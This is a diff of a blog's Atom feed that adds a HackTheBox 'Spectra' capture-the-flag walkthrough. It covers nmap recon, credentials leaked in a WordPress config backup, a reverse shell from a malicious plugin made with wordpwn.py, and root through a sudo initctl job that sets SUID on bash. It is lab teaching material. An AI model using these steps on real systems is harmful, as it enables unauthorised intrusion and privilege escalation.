@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
     <title type="text">Doomdesire</title>
     <subtitle type="html">MemE is a powerful and highly customizable GoHugo theme for personal blogs.</subtitle>
-    <updated>2021-06-25T12:13:26&#43;03:00</updated>
+    <updated>2021-06-26T19:03:58&#43;03:00</updated>
     <id>https://netuserdoomdesire.github.io/</id>
     <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://netuserdoomdesire.github.io/atom.xml" />
@@ -15,57 +15,212 @@
     
     <generator uri="https://gohugo.io/" version="0.83.1">Hugo</generator>
         <entry>
-            <title type="text">Upcoming Post (Offensive Technique)</title>
-            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/general/upcoming/" />
-            <id>https://netuserdoomdesire.github.io/posts/general/upcoming/</id>
-            <updated>2021-06-25T11:56:47&#43;03:00</updated>
-            <published>2021-06-09T20:26:52&#43;03:00</published>
-            <author>
-                    <name>Doomdesire</name>
-                    <uri>https://netuserdoomdesire.github.io/</uri>
-                    </author>
-            <summary type="html">Upcoming Post (Offensive Technique)</summary>
-            
-                <content type="html">&lt;p&gt;Upcoming Post (Offensive Technique)&lt;/p&gt;
-</content>
-            
-            
-            
-                
-                
-                
-                    
-                    
-                    
-                        
-                            <category scheme="https://netuserdoomdesire.github.io/posts/general/" term="posts\General\" label="posts\General\" />
-                        
-                    
-                
-            
-            
-            
-                
-                    
-                
-                    
-                
-            
-        </entry>
-    
-        <entry>
-            <title type="text">Upcoming: Spectra Writeup (HackTheBox)</title>
+            <title type="text">Spectra Writeup (HackTheBox)</title>
             <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/spectra/" />
             <id>https://netuserdoomdesire.github.io/posts/writeups/spectra/</id>
-            <updated>2021-06-25T11:59:50&#43;03:00</updated>
-            <published>2021-06-09T20:26:52&#43;03:00</published>
+            <updated>2021-06-26T19:03:12&#43;03:00</updated>
+            <published>2021-06-26T10:00:00&#43;03:00</published>
             <author>
                     <name>Doomdesire</name>
                     <uri>https://netuserdoomdesire.github.io/</uri>
                     </author>
-            <summary type="html">HackTheBox Spectra writeup will be uploaded on 26/6/2021</summary>
+            <summary type="html">Overview Machine: https://www.hackthebox.eu/home/machines/profile/317
+Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www.hackthebox.eu/home/users/profile/1190). We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user.</summary>
             
-                <content type="html">&lt;p&gt;HackTheBox Spectra writeup will be uploaded on 26/6/2021&lt;/p&gt;
+                <content type="html">&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/1.png&#34; alt=&#34;Pasted image 20210623152551.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/317&#34;&gt;https://www.hackthebox.eu/home/machines/profile/317&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190)&#34;&gt;https://www.hackthebox.eu/home/users/profile/1190)&lt;/a&gt;. We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user. We then again find a password file, this time belonging to a normal user, making us able to login via ssh. By taking advantage of the fact that the user can execute initctl with root privileges, we run a job that enables us to run bash with SUID permissions, obtaining root access.&lt;/p&gt;
+&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
+&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
+&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV 10.10.10.229 -oN spectra.nmap
+Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-23 15:16 EDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.229
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.081s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp   open  http    nginx 1.17.4
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.17.4
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+3306/tcp open  mysql   MySQL &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unauthorized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-cert: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_sslv2: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_tls-alpn: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_tls-nextprotoneg: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 41.19 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
+&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
+&lt;li&gt;-oN: Save the nmap output on the designated file in normal format.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;web-server&#34;&gt;Web Server&lt;/h3&gt;
+&lt;p&gt;From the nmap scan we can see that an &lt;strong&gt;HTTP&lt;/strong&gt; server is hosted on port &lt;strong&gt;80&lt;/strong&gt;. HTTP servers are generally the right path to start enumerating so we visit the page:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/2.png&#34; alt=&#34;Pasted image 20210623153743.png&#34;&gt;
+The server appears to be used for issue tracking. By clicking around the page we see the following:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/3.png&#34; alt=&#34;Pasted image 20210623154304.png&#34;&gt;
+This means the server tries to reach &lt;strong&gt;spectra.htb&lt;/strong&gt;, which is not mapped to an IP address. That in turn means we cannot continue until we edit our hosts file to map &lt;strong&gt;spectra.htb&lt;/strong&gt; to &lt;strong&gt;10.10.10.229&lt;/strong&gt; which is our target&amp;rsquo;s IP. We can do that with &lt;code&gt;nano /etc/hosts&lt;/code&gt;:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/4.png&#34; alt=&#34;Pasted image 20210623154645.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;first-link-wordpress-site&#34;&gt;First Link (Wordpress Site)&lt;/h3&gt;
+&lt;p&gt;By saving the hosts file, we can now navigate the pages. By clicking on the &lt;strong&gt;Software Issue Tracker&lt;/strong&gt; link now correctly redirects us to the following page:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/5.png&#34; alt=&#34;Pasted image 20210623155726.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Some instant information we can gather is that this is a Wordpress site and that &lt;strong&gt;administrator&lt;/strong&gt; is a username we can later user in case we want to get access to it. By clicking on the &lt;strong&gt;Log in&lt;/strong&gt; link (bottom right), we get to the Wordpress login page:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/6.png&#34; alt=&#34;Pasted image 20210623160559.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;There is something interesting to note here, which is a common bad practice on login pages, giving attackers the ability to validate if a username exists or not. We can see for example that trying to login with the username &lt;strong&gt;doomdesire&lt;/strong&gt; and a random password i get the following error:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/7.png&#34; alt=&#34;Pasted image 20210623161022.png&#34;&gt;
+However, trying to login as &lt;strong&gt;administrator&lt;/strong&gt; and a random password i get the following error:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/8.png&#34; alt=&#34;Pasted image 20210623161152.png&#34;&gt;
+which is clearly a different message from the previous one, confirming that &lt;strong&gt;administrator&lt;/strong&gt; is a valid name. Login pages should always have a consistent error message whether someone enters a valid username or not.
+At this point there were some things we could try in order to maybe login such as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Since this is a wordpress site, it&amp;rsquo;s a very good idea to run &lt;strong&gt;wpscan&lt;/strong&gt; which is a wordpress enumeration tool found here: &lt;a href=&#34;https://github.com/wpscanteam/wpscan&#34;&gt;https://github.com/wpscanteam/wpscan&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Since we have a valid username we could also brute force the login page trying out multiple passwords (in general this could potentially lock out a user or/and blacklist our IP so always use with caution).&lt;/li&gt;
+&lt;li&gt;We could use CeWL (&lt;a href=&#34;https://github.com/digininja/CeWL&#34;&gt;https://github.com/digininja/CeWL&lt;/a&gt;) to build a password list based on the words used on the site in order to use them for a more targeted password attack (again, be careful about lockouts/blacklists).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These are all great things to have in mind in general, however there was no success, making the wordpress site a dead end for the time being.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;second-link-test&#34;&gt;Second Link (Test)&lt;/h3&gt;
+&lt;p&gt;Apart from the &lt;strong&gt;Software Issue Tracker&lt;/strong&gt; link, there was also a &lt;strong&gt;Test&lt;/strong&gt; link on the initial page, that redirects us to &lt;a href=&#34;http://spectra.htb/testing/index.php&#34;&gt;http://spectra.htb/testing/index.php&lt;/a&gt; that returns us an &lt;strong&gt;Error establishing a database connection&lt;/strong&gt; message. However, index.php is not the only file hosted on &lt;strong&gt;/testing&lt;/strong&gt;, something that can be easily confirmed by visiting &lt;a href=&#34;http://spectra.htb/testing/&#34;&gt;http://spectra.htb/testing/&lt;/a&gt; :
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/9.png&#34; alt=&#34;Pasted image 20210623162742.png&#34;&gt;
+There are multiple .php files listed in this page. In general, you want to look at everything to ensure you did not miss something, however any file containing the words &amp;ldquo;&lt;strong&gt;config&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;&lt;strong&gt;login&lt;/strong&gt;&amp;rdquo; should be the first to read. Checking the &lt;strong&gt;wp-config.php.save&lt;/strong&gt; file from our browser, it seems to be empty, however by viewing the page source we see a lot of comments:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/SQL.png&#34; alt=&#34;Pasted image 20210623163534.png&#34;&gt;
+including &lt;strong&gt;MySQL&lt;/strong&gt; credentials!
+Note that Instead of viewing the page source we could also use &lt;code&gt;curl http://spectra.htb/testing/wp-config.php.save&lt;/code&gt; from our terminal and we would also be able to view it.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;accessing-the-wordpress-administrator-panel&#34;&gt;Accessing the Wordpress Administrator Panel&lt;/h3&gt;
+&lt;p&gt;We now have a password and including the newly found username &lt;strong&gt;devtest&lt;/strong&gt; we have 2 usernames we can try on the Wordpress login page we could not access earlier. Trying with the &lt;strong&gt;devstest&lt;/strong&gt; username brings no results, however, trying with the &lt;strong&gt;administrator&lt;/strong&gt; username get&amp;rsquo;s us right in:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/11.png&#34; alt=&#34;Pasted image 20210624164217.png&#34;&gt;
+Some instant information we can get is that Wordpress is out-of-date and that our version is &lt;strong&gt;5.4.2&lt;/strong&gt;. Of course we could have known this right from the start by looking for example at the page source of the login page:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/12.png&#34; alt=&#34;Pasted image 20210624163938.png&#34;&gt;
+or by using the firefox extension &amp;ldquo;&lt;strong&gt;Wappalyzer&lt;/strong&gt;&amp;quot;:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/13.png&#34; alt=&#34;Pasted image 20210624164029.png&#34;&gt;
+The version can also be found by the previously mentioned &lt;strong&gt;wpscan&lt;/strong&gt; tool.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;getting-a-shell-as-nginx&#34;&gt;Getting a shell as nginx&lt;/h3&gt;
+&lt;p&gt;Since we are on the Wordpress adminitration panel, there are some ways we can get a reverse shell. The method we are gonna use here is uploading a malicious plugin. There is a cool script we can use for this, that can be found here: &lt;a href=&#34;https://github.com/wetw0rk/malicious-wordpress-plugin&#34;&gt;https://github.com/wetw0rk/malicious-wordpress-plugin&lt;/a&gt;.
+It&amp;rsquo;s usage is pretty straightforward. We are gonna run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;chmod +x wordpwn.py
+./wordpwn.py 10.10.14.9 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; Y
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This will first make the script executable, then create file called &amp;ldquo;&lt;strong&gt;malicious.zip&lt;/strong&gt;&amp;rdquo; that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The &lt;code&gt;Y&lt;/code&gt; option declares that we want to automatically start a handler with metasploit:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/15.png&#34; alt=&#34;Pasted image 20210624170131.png&#34;&gt;
+As our handler is waiting to receive a connection, we upload our malicious plugin by navigating to &lt;code&gt;Plugins--&amp;gt;Add New--&amp;gt;Upload Plugin--&amp;gt;Browse&lt;/code&gt; and select the &lt;strong&gt;malicious.zip&lt;/strong&gt; file we generated with the script. We then select &lt;code&gt;Install Now&lt;/code&gt; and then &lt;code&gt;Activate Plugin&lt;/code&gt;:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/16.png&#34; alt=&#34;Pasted image 20210624170543.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As stated in the script github page, once the plugin is installed and activated, we just have to navigate to the following URLs to launch the reverse shell (we have to add the &lt;code&gt;/main&lt;/code&gt; part in the URL, which we can observe if we look the URL paths used by our target server. Not including this path will not work, since the 2 files we want to request will not be found):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php&#34;&gt;http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php&#34;&gt;http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;and we get a reverse shell:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/17.png&#34; alt=&#34;Pasted image 20210624170913.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;escalating-privileges-to-katie&#34;&gt;Escalating Privileges to Katie&lt;/h3&gt;
+&lt;p&gt;At first glance we can see there is another user on the box named Katie:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat /etc/passwd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/18.png&#34; alt=&#34;Pasted image 20210624171438.png&#34;&gt;
+If we want to get the &lt;strong&gt;user.txt&lt;/strong&gt; we have to escalate our privileges to that user. If we are going to avoid automated tools such as &lt;strong&gt;LinPeas&lt;/strong&gt;, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;find / -name *.conf* 2&amp;gt; /dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This will search for all files on the system that contain the &lt;strong&gt;.conf&lt;/strong&gt; part on their name. However running this will create a lot of noise from some folders such as &lt;strong&gt;/etc&lt;/strong&gt;, &lt;strong&gt;/mnt&lt;/strong&gt; and &lt;strong&gt;/usr&lt;/strong&gt; so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too.  To filter them out we run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;find / -name *.conf* 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/etc/&amp;#34;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/mnt/&amp;#34;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/20.png&#34; alt=&#34;Pasted image 20210624172845.png&#34;&gt;
+We notice a file named &lt;strong&gt;/opt/autologin.conf.orig&lt;/strong&gt;. Reading it, we see there is a password file on a folder named &lt;strong&gt;autologin&lt;/strong&gt; inside &lt;strong&gt;/etc&lt;/strong&gt;. Remember that we filtered out this folder! We could have easily missed it!
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/21.png&#34; alt=&#34;Pasted image 20210624173246.png&#34;&gt;
+Reading the &lt;strong&gt;passwd&lt;/strong&gt; file inside &lt;strong&gt;/etc/autologin/&lt;/strong&gt; we get a password:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/22.png&#34; alt=&#34;Pasted image 20210624173626.png&#34;&gt;
+The possible users to try logging in with this password are root and Katie. There was no success with root, however with Katie the credentials are valid and we can now login as her via ssh!
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/23.png&#34; alt=&#34;Pasted image 20210624173903.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h3&gt;
+&lt;p&gt;Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as &lt;strong&gt;LinPeas&lt;/strong&gt;, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -l
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This will list all the binaries Katie can run with sudo:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/24.png&#34; alt=&#34;Pasted image 20210624174625.png&#34;&gt;
+We see that we can run &lt;strong&gt;initctl&lt;/strong&gt; as root. As stated on it&amp;rsquo;s man page, initctl allows a system administrator to communicate and interact with the &lt;strong&gt;Upstart&lt;/strong&gt;. Upstart handles the starting of the tasks and services during boot and stopping them during shutdown. By interacting with the Upstart, we can make initctl start or stop jobs. The way initctl understands what jobs it can work with is by reading the configuration files of them, found on the /etc/init folder. So if we manage to make our own job, we can start it and it will run as the root user since we have sudo rights. So we have 2 options:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a new job by writing a new configuration file (.conf).&lt;/li&gt;
+&lt;li&gt;Edit an already existing one.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The first option is not possible since we do not have permission to write on the /etc folder. That leaves us with the second option. By searching through the /etc/init folder we see that we can&amp;rsquo;t edit all files, however we have the rights to edit some of the files in there. Great!
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/25.png&#34; alt=&#34;Pasted image 20210624180211.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Below we can see what a job configuration file looks like:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/26.png&#34; alt=&#34;Pasted image 20210624180517.png&#34;&gt;
+Notice the part between &amp;ldquo;&lt;strong&gt;script&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;&lt;strong&gt;end script&lt;/strong&gt;&amp;rdquo;. That part contains the commands that are gonna run when the job starts. What we want to do is replace these commands with our own. There are some choices here, so let&amp;rsquo;s try making the job set the SUID permission on /bin/bash. This will let us run bin/bash with root privileges. In this example, i edit the &lt;code&gt;test.conf&lt;/code&gt; file with &lt;code&gt;nano&lt;/code&gt;:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/28.png&#34; alt=&#34;Pasted image 20210624182236.png&#34;&gt;
+Once we edit the job configuration file we need to start it with initctl (with sudo). After we start it, the job will execute &lt;code&gt;sudo +s /bin/bash&lt;/code&gt; as the root user.  We can confirm it worked by executing &lt;code&gt;/bin/bash&lt;/code&gt; with the &lt;code&gt;-p&lt;/code&gt; flag. The &lt;code&gt;-p&lt;/code&gt; flag is required in order for this to work since it is used to turn on privileged mode, making the bash shell run with the SUID privileges we set with the job:
+&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/29.png&#34; alt=&#34;Pasted image 20210624182515.png&#34;&gt;
+We are root!&lt;/p&gt;
+&lt;h1 id=&#34;resources&#34;&gt;Resources&lt;/h1&gt;
+&lt;p&gt;A good place to learn about &lt;strong&gt;Upstart&lt;/strong&gt; and &lt;strong&gt;initctl&lt;/strong&gt;:
+&lt;a href=&#34;https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it&#34;&gt;https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;
 </content>
             
             
